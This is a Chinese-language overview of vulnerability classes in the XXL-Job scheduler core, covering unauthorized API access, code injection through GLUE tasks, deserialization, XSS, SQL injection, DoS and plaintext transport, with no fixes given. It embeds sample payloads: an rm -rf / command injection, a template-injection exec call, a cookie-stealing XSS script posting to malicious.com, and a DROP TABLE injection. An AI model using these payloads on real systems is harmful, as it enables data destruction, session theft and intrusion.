## XXL-Job-Core 安全漏洞全量描述（Java 语言）
XXL-Job 是一款分布式任务调度框架，`xxl-job-core` 作为其核心依赖包，承载了任务调度、执行、通信等核心能力。该组件在不同版本中暴露的安全漏洞涉及权限控制、输入验证、通信安全、序列化等多个维度，以下是各类漏洞的完整场景与细节描述（无修复建议）。

## 一、未授权访问漏洞
### 1. 核心漏洞场景
`xxl-job-core` 中负责任务调度、执行器注册、任务触发的核心接口（如 `/api/*`、`/admin/*` 等），在未做严格鉴权的版本中，存在默认无认证/弱认证机制，导致未授权攻击者可直接访问核心接口。
### 2. 具体触发条件与影响
- **版本范围**：主要影响 2.3.0 及以下部分版本，以及部分自定义部署未加固鉴权的高版本实例；
- **无认证接口**：
  - 执行器注册接口（`/xxl-job-admin/api/registry`）：未授权攻击者可伪造执行器注册信息，篡改任务执行节点，导致任务被调度至恶意节点；
  - 任务触发接口（`/xxl-job-admin/api/run`）：无需认证即可手动触发任意任务，包括修改任务参数后触发，引发业务逻辑异常（如批量数据删除、恶意数据插入）；
  - 任务列表查询接口（`/xxl-job-admin/api/jobInfo/pageList`）：可遍历获取所有任务的配置信息（包括任务参数、执行时间、执行器地址），泄露敏感业务数据；
- **弱认证绕过**：部分版本虽提供简单的 token 认证，但 token 配置默认值（如 `default_token`）未被修改，攻击者可通过默认 token 直接绕过鉴权；
- **跨执行器未授权调用**：执行器端（`xxl-job-executor`）的任务执行接口未校验调用方身份，攻击者可直接向执行器发送任务执行指令，触发任意代码执行。

## 二、远程代码执行（RCE）漏洞
### 1. 核心漏洞场景
`xxl-job-core` 支持通过 GLUE 模式（如 GLUE-Java、GLUE-Groovy）动态加载执行任务代码，或通过序列化机制传输任务参数，未做严格的输入校验和沙箱限制，导致攻击者可注入恶意代码并执行。
### 2. 具体触发条件与影响
#### （1）GLUE 模式代码注入
- **触发条件**：
  - 攻击者通过未授权访问获取任务编辑权限，或内部人员恶意配置；
  - GLUE-Java/GLUE-Groovy 模式下，任务代码支持动态编辑且无代码沙箱限制，可直接编写任意 Java/Groovy 代码；
- **影响**：
  - 注入 `Runtime.getRuntime().exec("rm -rf /")` 等系统命令，破坏服务器文件系统；
  - 注入网络请求代码，将服务器敏感数据（如数据库账号、配置文件）发送至恶意服务器；
  - 注入反弹 shell 代码，获取服务器完整控制权限。

#### （2）序列化反序列化漏洞
- **触发条件**：
  - `xxl-job-core` 早期版本（如 2.2.0 及以下）使用 Java 原生序列化/反序列化机制传输任务参数；
  - 攻击者可构造恶意序列化 payload（如基于 CommonsCollections、Fastjson 等链），通过任务参数、执行器注册等接口传入；
- **影响**：反序列化过程中触发恶意代码执行，无需依赖 GLUE 模式，攻击路径更隐蔽。

#### （3）脚本引擎注入
- **触发条件**：部分版本支持通过任务参数传入脚本片段（如 Velocity、Freemarker 模板），未做参数过滤；
- **影响**：注入 `${new java.lang.Runtime().exec("whoami")}` 等模板注入代码，执行任意系统命令。

## 三、敏感信息泄露漏洞
### 1. 核心漏洞场景
`xxl-job-core` 在日志输出、接口返回、配置文件加载等环节未做敏感信息脱敏，导致账号密码、数据库连接、任务参数等敏感数据泄露。
### 2. 具体触发条件与影响
- **日志泄露**：
  - 任务执行失败时，日志会完整输出任务参数（如包含用户密码、支付信息）、执行器地址、数据库连接串；
  - 管理员后台操作日志未脱敏，记录了登录账号、token、接口调用参数；
- **接口返回泄露**：
  - `/xxl-job-admin/api/jobInfo/info` 接口返回任务完整配置，包括 GLUE 代码、执行器账号密码；
  - `/xxl-job-admin/api/user/list` 接口未授权访问时，返回所有管理员账号的明文/加密密码；
- **配置文件泄露**：
  - 执行器端 `xxl-job-executor.properties` 配置文件若放置在 web 可访问目录，可直接下载，获取 admin 地址、access_token 等；
  - 核心配置（如数据库密码）在内存中以明文存储，可通过内存dump工具获取。

## 四、权限绕过与越权操作漏洞
### 1. 核心漏洞场景
`xxl-job-core` 的权限控制粒度不足，仅区分“管理员”和“普通用户”，且权限校验逻辑存在缺陷，导致低权限用户可操作高权限功能，或普通用户越权管理任务。
### 2. 具体触发条件与影响
- **水平越权**：
  - 普通用户可通过修改请求参数（如 `jobId`、`executorId`），查看/修改其他用户创建的任务；
  - 执行器端可通过伪造 `appName`，访问其他执行器的任务执行记录；
- **垂直越权**：
  - 普通用户可调用管理员专属接口（如 `/xxl-job-admin/api/user/add`），创建管理员账号；
  - 未授权用户可通过修改请求头（如 `X-XXL-Job-Token`），绕过接口权限校验，执行任务删除、暂停等操作；
- **权限配置绕过**：
  - 部分版本中，若管理员未配置“禁止手动触发任务”，普通用户可通过接口直接触发系统级任务（如数据备份、定时清算）；
  - 执行器端未校验任务的“执行权限”，即使任务配置为“仅调度中心触发”，仍可通过手动调用执行器接口触发。

## 五、拒绝服务（DoS）漏洞
### 1. 核心漏洞场景
`xxl-job-core` 对接口请求频率、任务执行资源、参数长度等未做限制，攻击者可通过恶意请求耗尽服务器资源，导致调度中心或执行器不可用。
### 2. 具体触发条件与影响
- **接口洪泛攻击**：
  - 向 `/xxl-job-admin/api/registry` 接口发送大量伪造的执行器注册请求，导致调度中心连接池耗尽，无法处理正常执行器注册；
  - 向任务触发接口发送高频请求，触发大量任务并发执行，耗尽服务器 CPU、内存资源；
- **恶意任务参数攻击**：
  - 提交超长任务参数（如 100MB 字符串），导致调度中心数据库写入超时、执行器解析参数时内存溢出；
  - 创建无限循环的 GLUE 任务（如 `while(true){}`），触发后执行器进程卡死，无法处理其他任务；
- **连接耗尽攻击**：
  - 攻击者与调度中心建立大量长连接（如基于 Netty 的通信连接），未释放连接，导致调度中心连接池满，正常执行器无法通信。

## 六、跨站脚本攻击（XSS）漏洞
### 1. 核心漏洞场景
`xxl-job-core` 管理员后台（Web 端）未对用户输入的任务名称、参数、GLUE 代码等做 XSS 过滤，攻击者可注入恶意脚本，窃取管理员 Cookie、劫持会话。
### 2. 具体触发条件与影响
- **存储型 XSS**：
  - 在任务名称中注入 `<script>document.location.href='http://malicious.com?cookie='+document.cookie</script>`，管理员查看任务列表时触发脚本执行，窃取管理员登录 Cookie；
  - 在 GLUE 代码备注中注入 XSS 脚本，存储在数据库中，所有访问该任务的用户都会触发；
- **反射型 XSS**：
  - 任务查询接口的参数（如 `jobName`）未做过滤，构造 `jobName=<script>alert(1)</script>`，访问时触发脚本；
  - 错误页面的参数回显（如 `errorMsg`）未做转义，注入恶意脚本。

## 七、SQL 注入漏洞
### 1. 核心漏洞场景
`xxl-job-core` 部分接口使用拼接 SQL 的方式查询/修改数据，未使用预编译语句，导致攻击者可通过参数注入恶意 SQL 语句，篡改或窃取数据库数据。
### 2. 具体触发条件与影响
- **触发场景**：
  - 任务列表查询接口（`/xxl-job-admin/api/jobInfo/pageList`）的 `jobName` 参数拼接至 SQL 中，构造 `jobName=' or 1=1 --`，可查询所有任务；
  - 执行器注册接口的 `appName` 参数未过滤，注入 `appName='; DROP TABLE xxl_job_info; --`，删除核心数据表；
- **影响**：
  - 窃取数据库中管理员账号、任务配置、执行日志等敏感数据；
  - 篡改任务配置（如修改任务执行参数为恶意内容）；
  - 删除核心数据表（如 `xxl_job_info`、`xxl_job_log`），导致调度中心瘫痪。

## 八、通信传输安全漏洞
### 1. 核心漏洞场景
`xxl-job-core` 调度中心与执行器之间的通信默认采用 HTTP 明文传输，且未对传输数据做完整性校验，导致数据可被窃听、篡改。
### 2. 具体触发条件与影响
- **明文传输风险**：
  - 调度中心与执行器之间传输的任务参数、access_token、执行结果等数据以明文形式传输，可被中间人劫持获取；
  - 攻击者可通过抓包获取 access_token，后续用于未授权访问；
- **数据篡改风险**：
  - 中间人可篡改传输的任务参数（如将正常的任务参数改为恶意命令），执行器接收后执行错误逻辑；
  - 篡改执行结果（如将“执行失败”改为“执行成功”），导致调度中心获取错误的任务状态，影响业务决策；
- **无重放攻击防护**：
  - 通信请求未添加时间戳、随机数等防重放机制，攻击者可重放已捕获的合法请求，重复触发任务执行。
